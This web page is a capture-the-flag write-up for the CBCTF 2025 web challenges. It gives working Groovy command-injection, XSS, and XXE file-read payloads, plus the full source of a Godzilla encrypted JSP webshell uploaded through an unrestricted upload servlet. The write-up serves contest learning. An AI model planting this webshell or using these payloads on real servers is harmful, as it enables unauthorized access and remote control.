@@ -1,0 +1,377 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="KaGty1" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
+    
+      CBCTF(2025) Web Writeup 
+      
+      
+      |
+    
+     KaGty1 &#39;s Personal Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
+    <link rel="icon" href="/images/kagty1.jpg">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+    
+<link rel="stylesheet" href="/css/figcaption/mac-block.css">
+
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/kagty1.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">kagty1</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+        <li class="nav-item" data-path="/ctf/">
+          <a href="/ctf/">CTF</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">CBCTF(2025) Web Writeup</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+          2025-10-06 23:26:59
+        </span>
+        
+      </div>
+      <div class="markdown-body">
+        <h1 id="CB-2025-CTF"><a href="#CB-2025-CTF" class="headerlink" title="CB(2025) CTF"></a>CB(2025) CTF</h1><p><strong>杭州电子科技大学招新赛 - Web方向，除了一道0day其它AK，当时在复现Spring Cloud Gateway环境属性那个洞，没来得及去管这个题。</strong></p>
+<p>‍</p>
+<h3 id="ez-groovy"><a href="#ez-groovy" class="headerlink" title="ez_groovy"></a>ez_groovy</h3><p>签到题，未做任何过滤的<code>groovy</code>命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/groovy/exec?content=&quot;env&quot;.execute().text</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<h3 id="ezxss"><a href="#ezxss" class="headerlink" title="ezxss"></a>ezxss</h3><p>题目存在<code>xss</code>但是不出网，可以让<code>bot</code>把<code>flag</code>结果通过<code>submitNote</code>提交到前台</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">(async () =&gt; &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="variable">flagRes</span> <span class="operator">=</span> await <span class="title function_">fetch</span><span class="params">(<span class="string">&#x27;/flag&#x27;</span>)</span>;</span><br><span class="line">        <span class="type">const</span> <span class="variable">flag</span> <span class="operator">=</span> await flagRes.text();</span><br><span class="line">        await <span class="title function_">fetch</span><span class="params">(<span class="string">&#x27;/submitNote&#x27;</span>, &#123;</span></span><br><span class="line"><span class="params">            method: <span class="string">&#x27;POST&#x27;</span>,</span></span><br><span class="line"><span class="params">            headers: &#123; <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span> &#125;,</span></span><br><span class="line"><span class="params">            body: JSON.stringify(&#123;</span></span><br><span class="line"><span class="params">                noteName: <span class="string">&#x27;leak&#x27;</span>,</span></span><br><span class="line"><span class="params">                note: <span class="string">&#x27;FLAG: &#x27;</span> + flag</span></span><br><span class="line"><span class="params">            &#125;)</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        console.error(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>然后访问<code>http://&lt;ip&gt;/bot?noteName=evil</code> （<code>evil</code>是你自己取的名字）</p>
+<p>最后访问<code>http://&lt;ip&gt;/notes/leak</code>读<code>flag</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250927125310-r75ljc9.png" alt="image-20250927125310-r75ljc9"></p>
+<h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p>简单的<code>XXE</code>代码审计，<code>username</code>是回显点，直接利用<code>file://</code>协议读即可</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/register.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.37.152.107:59594</span><br><span class="line"></span><br><span class="line"><span class="language-llvm">username<span class="operator">=</span>jiale<span class="number">2</span>&amp;password<span class="operator">=</span>mypassword&amp;user_xml_format<span class="operator">=</span><span class="variable">%3</span>C<span class="variable">%3</span>Fxml<span class="variable">%20</span>version<span class="variable">%3</span>D<span class="variable">%221</span>.<span class="number">0</span><span class="variable">%22</span><span class="variable">%3</span>F<span class="variable">%3</span>E<span class="variable">%0</span>A<span class="variable">%3</span>C<span class="title">!DOCTYPE</span><span class="variable">%20</span>userinfo<span class="variable">%20</span><span class="variable">%5</span>B<span class="variable">%0</span>A<span class="variable">%20</span><span class="variable">%20</span><span class="variable">%3</span>C<span class="title">!ENTITY</span><span class="variable">%20</span>file<span class="variable">%20</span>SYSTEM<span class="variable">%20</span><span class="variable">%22</span>file<span class="variable">%3</span>A<span class="variable">%2</span>F<span class="variable">%2</span>F<span class="variable">%2</span>Fflag<span class="variable">%22</span><span class="variable">%3</span>E<span class="variable">%0</span>A<span class="variable">%5</span>D<span class="variable">%3</span>E<span class="variable">%0</span>A<span class="variable">%3</span>Cuserinfo<span class="variable">%3</span>E<span class="variable">%3</span>Cuser<span class="variable">%3</span>E<span class="variable">%3</span>Cusername<span class="variable">%3</span>E<span class="variable">%26</span>file<span class="variable">%3</span>B<span class="variable">%3</span>C<span class="variable">%2</span>Fusername<span class="variable">%3</span>E<span class="variable">%3</span>Cpassword<span class="variable">%3</span>E<span class="variable">%26</span>file<span class="variable">%3</span>B<span class="variable">%3</span>C<span class="variable">%2</span>Fpassword<span class="variable">%3</span>E<span class="variable">%3</span>C<span class="variable">%2</span>Fuser<span class="variable">%3</span>E<span class="variable">%3</span>C<span class="variable">%2</span>Fuserinfo<span class="variable">%3</span>E</span></span><br></pre></td></tr></table></figure>
+
+<p>然后调用<code>login.php</code>触发<code>XXE</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250927132040-j6c629t.png" alt="image-20250927132040-j6c629t"></p>
+<p>‍</p>
+<h3 id="Kill-tomcat-memshell"><a href="#Kill-tomcat-memshell" class="headerlink" title="Kill-tomcat-memshell"></a>Kill-tomcat-memshell</h3><p>文件上传 + 内存马查杀</p>
+<p>先看<code>web.xml /UploadLogo</code>路由，存在文件上传漏洞</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadLogoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>com.web.UploadLogoServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>UploadLogoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/UploadLogo<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@MultipartConfig(</span></span><br><span class="line"><span class="meta">    fileSizeThreshold = 1048576,</span></span><br><span class="line"><span class="meta">    maxFileSize = 10485760L,</span></span><br><span class="line"><span class="meta">    maxRequestSize = 15728640L</span></span><br><span class="line"><span class="meta">)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UploadLogoServlet</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">UploadLogoServlet</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="type">Part</span> <span class="variable">filePart</span> <span class="operator">=</span> request.getPart(<span class="string">&quot;file&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileName</span> <span class="operator">=</span> filePart.getSubmittedFileName();</span><br><span class="line">        <span class="type">String</span> <span class="variable">basePath</span> <span class="operator">=</span> <span class="built_in">this</span>.getServletContext().getRealPath(<span class="string">&quot;/uploads&quot;</span>);</span><br><span class="line">        <span class="type">File</span> <span class="variable">uploadsDir</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(basePath);</span><br><span class="line">        <span class="keyword">if</span> (!uploadsDir.exists()) &#123;</span><br><span class="line">            uploadsDir.mkdirs();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(uploadsDir, fileName);</span><br><span class="line">        filePart.write(file.getAbsolutePath());</span><br><span class="line">        <span class="type">String</span> <span class="variable">fileUrl</span> <span class="operator">=</span> request.getContextPath() + <span class="string">&quot;/uploads/&quot;</span> + fileName;</span><br><span class="line">        response.getWriter().print(<span class="string">&quot;Logo uploaded successfully! URL: &quot;</span> + fileUrl);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>直接上传哥斯拉马 -&gt; <a target="_blank" rel="noopener" href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a></p>
+<p><code>test.jsp</code>​</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%! String xc=<span class="string">&quot;3c6e0b8a9c15224a&quot;</span>; String pass=<span class="string">&quot;pass&quot;</span>; String md5=md5(pass+xc); <span class="keyword">class</span> <span class="title class_">X</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span>&#123;<span class="keyword">public</span> <span class="title function_">X</span><span class="params">(ClassLoader z)</span>&#123;<span class="built_in">super</span>(z);&#125;<span class="keyword">public</span> Class <span class="title function_">Q</span><span class="params">(<span class="type">byte</span>[] cb)</span>&#123;<span class="keyword">return</span> <span class="built_in">super</span>.defineClass(cb, <span class="number">0</span>, cb.length);&#125; &#125;<span class="keyword">public</span> <span class="type">byte</span>[] x(<span class="type">byte</span>[] s,<span class="type">boolean</span> m)&#123; <span class="keyword">try</span>&#123;javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(<span class="string">&quot;AES&quot;</span>);c.init(m?<span class="number">1</span>:<span class="number">2</span>,<span class="keyword">new</span> <span class="title class_">javax</span>.crypto.spec.SecretKeySpec(xc.getBytes(),<span class="string">&quot;AES&quot;</span>));<span class="keyword">return</span> c.doFinal(s); &#125;<span class="keyword">catch</span> (Exception e)&#123;<span class="keyword">return</span> <span class="literal">null</span>; &#125;&#125; <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">md5</span><span class="params">(String s)</span> &#123;<span class="type">String</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> &#123;java.security.MessageDigest m;m = java.security.MessageDigest.getInstance(<span class="string">&quot;MD5&quot;</span>);m.update(s.getBytes(), <span class="number">0</span>, s.length());ret = <span class="keyword">new</span> <span class="title class_">java</span>.math.BigInteger(<span class="number">1</span>, m.digest()).toString(<span class="number">16</span>).toUpperCase();&#125; <span class="keyword">catch</span> (Exception e) &#123;&#125;<span class="keyword">return</span> ret; &#125; <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">base64Encode</span><span class="params">(<span class="type">byte</span>[] bs)</span> <span class="keyword">throws</span> Exception &#123;Class base64;<span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);<span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getEncoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encodeToString&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="type">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Encoder&quot;</span>); <span class="type">Object</span> <span class="variable">Encoder</span> <span class="operator">=</span> base64.newInstance(); value = (String)Encoder.getClass().getMethod(<span class="string">&quot;encode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; <span class="type">byte</span>[].class &#125;).invoke(Encoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125; <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] base64Decode(String bs) <span class="keyword">throws</span> Exception &#123;Class base64;<span class="type">byte</span>[] value = <span class="literal">null</span>;<span class="keyword">try</span> &#123;base64=Class.forName(<span class="string">&quot;java.util.Base64&quot;</span>);<span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.getMethod(<span class="string">&quot;getDecoder&quot;</span>, <span class="literal">null</span>).invoke(base64, <span class="literal">null</span>);value = (<span class="type">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e) &#123;<span class="keyword">try</span> &#123; base64=Class.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>); <span class="type">Object</span> <span class="variable">decoder</span> <span class="operator">=</span> base64.newInstance(); value = (<span class="type">byte</span>[])decoder.getClass().getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;).invoke(decoder, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; bs &#125;);&#125; <span class="keyword">catch</span> (Exception e2) &#123;&#125;&#125;<span class="keyword">return</span> value; &#125;%&gt;&lt;%<span class="keyword">try</span>&#123;<span class="type">byte</span>[] data=base64Decode(request.getParameter(pass));data=x(data, <span class="literal">false</span>);<span class="keyword">if</span> (session.getAttribute(<span class="string">&quot;payload&quot;</span>)==<span class="literal">null</span>)&#123;session.setAttribute(<span class="string">&quot;payload&quot;</span>,<span class="keyword">new</span> <span class="title class_">X</span>(<span class="built_in">this</span>.getClass().getClassLoader()).Q(data));&#125;<span class="keyword">else</span>&#123;request.setAttribute(<span class="string">&quot;parameters&quot;</span>,data);java.io.ByteArrayOutputStream arrOut=<span class="keyword">new</span> <span class="title class_">java</span>.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute(<span class="string">&quot;payload&quot;</span>)).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(<span class="number">0</span>,<span class="number">16</span>));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), <span class="literal">true</span>)));response.getWriter().write(md5.substring(<span class="number">16</span>));&#125; &#125;<span class="keyword">catch</span> (Exception e)&#123;&#125;%&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250927121508-d9c5cqc.png" alt="image-20250927121508-d9c5cqc"></p>
+<p>上传成功，哥斯拉连接：</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250927121602-iri7vol.png" alt="image-20250927121602-iri7vol"></p>
+<p>‍</p>
+<p><strong>内存马查杀</strong></p>
+<p>已知<code>flag</code>在<code>/check.log</code>文件中，需要清除内存马后才能回显<code>flag</code>​</p>
+<p>因为项目是用<code>Tomcat</code>启动的，所以先看看<code>Tomcat</code>日志文件是怎么检测内存马是否被查杀的 -&gt; <code>/usr/local/tomcat/logs/localhost_access_log.2025-09-27.txt</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250927121847-xahoxo4.png" alt="image-20250927121847-xahoxo4"></p>
+<p>‍</p>
+<p>杀内存马最简单的方式就是重启<code>Web</code>服务器，关机和启动脚本位于<code>/usr/local/tomcat/bin/shutdown.sh</code>和<code>/usr/local/tomcat/bin/startup.sh</code>​</p>
+<p>不能逐个执行，若先关机我们的马就掉了，重新写一个<code>restart.sh</code>，先执行<code>shutdown.sh</code>再执行<code>startup.sh</code>​</p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">/usr/local/tomcat/bin/shutdown.sh</span><br><span class="line">sleep <span class="number">5</span></span><br><span class="line">/usr/local/tomcat/bin/startup.sh</span><br></pre></td></tr></table></figure>
+
+<p>给权限 -&gt; <code>chmod +x /usr/local/tomcat/bin/restart.sh</code>​</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250927122310-ul9cyym.png" alt="image-20250927122310-ul9cyym"></p>
+<p>执行<code>restart.sh</code>，重启后再读<code>/check.log</code>，拿到flag</p>
+<p><img src="https://img-1325537595.cos.ap-beijing.myqcloud.com/undefinedimage-20250927122448-r06uafb.png" alt="image-20250927122448-r06uafb"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/09/25/CVE-2025-41243%20Spring%20Cloud%20Gateway%20%E7%8E%AF%E5%A2%83%E5%B1%9E%E6%80%A7%E4%BF%AE%E6%94%B9%E6%BC%8F%E6%B4%9E/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
+              2025-10-06 23:26:59
+            </span>
+            
+          </div>
+          <div class="post-foot-prev">
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CB-2025-CTF"><span class="toc-text">CB(2025) CTF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-groovy"><span class="toc-text">ez_groovy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ezxss"><span class="toc-text">ezxss</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ez-php"><span class="toc-text">ez_php</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Kill-tomcat-memshell"><span class="toc-text">Kill-tomcat-memshell</span></a></li></ol></li></ol></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+
+
+
+      </div>
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
+              <a title="github" target="_blank" rel="noopener" href="https://github.com/KaGty1">
+                <i class="iconfont icon-github"></i>
+              </a>
+              
+        </li>
+        
+    </ul>
+  </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Copyright © 2025 Oranges</a>
+        
+    </div>
+  
+    
+    <div class="footer-more">
+      
+        <a target="_blank" rel="noopener" href="https://github.com/zchengsite/hexo-theme-oranges">Theme by Oranges | Powered by Hexo</a>
+        
+    </div>
+  
+  
+    <div class="footer-views">
+      
+      
+          本文总阅读量<span id="busuanzi_value_page_pv"></span>次
+        
+      
+      
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + CBCTF(2025)%20Web%20Writeup + '&url=' + http%3A%2F%2Fkagty1.github.io%2F2025%2F10%2F06%2Fctf%2FCB(2025)%2520CTF%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=http://kagty1.github.io/2025/10/06/ctf/CB(2025)%20CTF/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
